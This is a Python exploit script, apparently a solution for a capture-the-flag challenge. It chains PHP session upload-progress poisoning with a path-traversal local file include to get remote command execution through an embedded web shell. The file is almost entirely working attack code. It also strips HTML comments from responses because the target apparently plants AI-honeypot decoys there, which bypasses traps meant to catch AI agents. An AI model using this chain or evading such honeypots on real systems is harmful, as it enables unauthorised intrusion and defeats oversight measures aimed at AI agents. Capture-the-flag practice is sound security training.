#!/usr/bin/env python3
"""PoC for the Persistence challenge.

Session progress poisoning -> LFI include of /tmp/sess_<id> -> RCE.
Dependency free (stdlib only).
"""
import argparse
import re
import urllib.error
import urllib.parse
import urllib.request

PROGRESS_FIELD = "PHP_SESSION_UPLOAD_PROGRESS"
PAYLOAD = b"<?php system($_GET['c']); ?>"


def http_get(url):
    return urllib.request.urlopen(url).read().decode(errors="replace")


def poison(base, session_id):
    boundary = "----vaultnotes"
    b = boundary.encode()
    body = b"".join([
        b"--" + b + b"\r\n",
        b'Content-Disposition: form-data; name="' + PROGRESS_FIELD.encode() + b'"\r\n\r\nvault\r\n',
        b"--" + b + b"\r\n",
        b'Content-Disposition: form-data; name="attachment"; filename="' + PAYLOAD + b'"\r\n',
        b"Content-Type: image/png\r\n\r\n",
        b"\x89PNG\r\n\x1a\n" + b"0" * 64 + b"\r\n",
        b"--" + b + b"--\r\n",
    ])
    req = urllib.request.Request(
        base.rstrip("/") + "/upload.php",
        data=body,
        headers={
            "Content-Type": "multipart/form-data; boundary=" + boundary,
            "Cookie": "PHPSESSID=" + session_id,
        },
    )
    try:
        urllib.request.urlopen(req)
    except urllib.error.HTTPError:
        pass


def execute(base, session_id, command):
    article = "../../../../tmp/sess_" + session_id
    url = base.rstrip("/") + "/view.php?" + urllib.parse.urlencode(
        {"article": article, "c": command}
    )
    html = http_get(url)
    # The app plants AI-honeypot decoys inside HTML comments. Strip them so the
    # output only shows the real command result.
    return re.sub(r"<!--.*?-->", "", html, flags=re.S)


def main():
    parser = argparse.ArgumentParser(description="Persistence exploit")
    parser.add_argument("target", help="e.g. http://localhost:30007")
    parser.add_argument("-c", "--command", default="cat /flag_*")
    parser.add_argument("-s", "--session", default="pwn")
    args = parser.parse_args()

    poison(args.target, args.session)
    print(execute(args.target, args.session, args.command))


if __name__ == "__main__":
    main()
